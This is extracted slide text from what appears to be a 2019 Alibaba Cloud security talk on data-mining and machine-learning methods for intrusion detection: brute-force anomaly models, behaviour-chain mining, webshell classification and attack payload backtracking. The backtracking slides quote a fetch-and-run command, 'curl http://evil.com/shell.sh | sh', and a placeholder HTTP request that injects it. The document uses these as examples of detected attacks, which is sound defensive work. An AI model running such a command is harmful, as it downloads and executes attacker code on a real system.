E nhance S ecurity A w areness w ith D ata M ining
Data-driven Intrusion Detection Solutions in Alibaba Cloud
Yue Xu (cdxy)
Security Engineer @ A lib ab a C loud
H an Zheng (LittleH ann)
Security Engineer @ A lib ab a C loud
M ay 29, 2019
Enhance Security Awareness with Data Mining 
Data-driven Intrusion Detection Solutions in Alibaba Cloud 
Han Zheng 
Security Engineer 
May 29,2019 
Yue Xu 
Senior Security Engineer 
Team
We are the research-engineering team implementing algorithms
and maintaining intrusion detection & threat intelligence to Alibaba
Cloud Security Center
Han Zheng, Yue Xu, Wei He
Cloud + Security
Advantages
•
Data computing ability
•
Rich security logs
•
God data vision
Challenges
•
Massive business environment
•
All manner of adversaries, from 'script 
kiddies' to nation states
•
Precision and recall are both concerned
Data Flow
Table of Threat Modeling Cases
•
Brute-force Attack
•
Malicious Behavior Chain
•
Malicious Web Script (a.k.a webshell)
•
Attack Payload Backtracking
Table of Threat Modeling Cases
•
Brute-force Attack
•
Malicious Behavior Chain
•
Malicious Web Script (a.k.a webshell)
•
Attack Payload Backtracking
Rule-based Decision Problem
Features of server login events
•
Rule-based decision is hard to balance False 
Positives and True Negative.
•
Different servers have different behaviors. 
Prior Knowledge is not adaptive to all cases.
Multivariate Gauss Model
Find Abnormal Behaviors
Gaussian Distribution
Table of Threat Modeling Cases
•
Brute-force Attack
•
Malicious Behavior Chain
•
Malicious Web Script (a.k.a webshell)
•
Attack Payload Backtracking
Malicious Behavior Chain
Pattern Mining
Links of Process/File/Network Entities
Generate Strong Association Rules
DDG Miner Commands
Pattern Matched 
Table of Threat Modeling Cases
•
Brute-force Attack
•
Malicious Behavior Chain
•
Malicious Web Script (a.k.a webshell)
•
Attack Payload Backtracking
Malicious Web Script
Two kinds of malicious PHP script (webshell)
Features
01 text
03 dynamic function call
02 opcode
Machine Learning Performance
Daily infected hosts (Feb.-Apr.)
ML
Improvement
Rule-based
Results
Lab performance:
Tested on 30,000 samples
achieved F1=98.78%, AUC=99.97%
Online performance:
Increase 17% detections with one false 
positive alert in 3 months.
Table of Threat Modeling Cases
•
Brute-force Attack
•
Malicious Behavior Chain
•
Malicious Web Script (a.k.a webshell)
•
Attack Payload Backtracking
Automated Attack Backtracking
Found malicious process:
curl http://evil.com/shell.sh | sh
How did I get invaded?
Attacker's HTTP request is:
POST
/XXX/XXXX HTTP/1.1
Host:
xxx.xx.xxx:7001
cmd=curl http://evil.com/shell.sh
| sh&XXXXXXXXXX
text similarity analysis
Problem:
What if attacker's payload 
was encoded/encrypted?
Encoded Payload Backtracking
Solved: 
Payload Backtracking without
text feature and vulnerability knowledge
Works only:
one-to-many attack
Encoded Payload Backtracking Case
Found: webshell connection flow
(Payload was encoded with base64)
Encoded Payload Backtracking Case
Found: Java Deserialization Exploit
(Payload was encoded with Java serialization)
Encoded Payload Backtracking
Found: RCE caused by SQLI
(RCE payload hiding in a special hex-like string)
Enhance Security Awareness with Data Mining
•
Label data scarcity and unclear threat boundary limit the performance of 
machine learning in security scenarios.
•
AI is not a ‘silver bullet’ against cyber threats. It is important to determine 
when AI is needed and how to quantify the improvement.
•
No free lunch theorem, you must choose the algorithm according to the 
actual situation of the project.
Cloud + Security
Advantages & Challenges
Threat Modeling Cases
•
Brute-force Attack
•
Abnormal Process Startup
•
Malicious Web Script (a.k.a webshell)
•
Attack Payload Backtracking
Q&A
Enhance Security Awareness with Data Mining 
Han Zheng 
PI:EMAIL 
Yue Xu 
PI:EMAIL 
郑瀚Andrew_Hann
cdxy000
cdxy_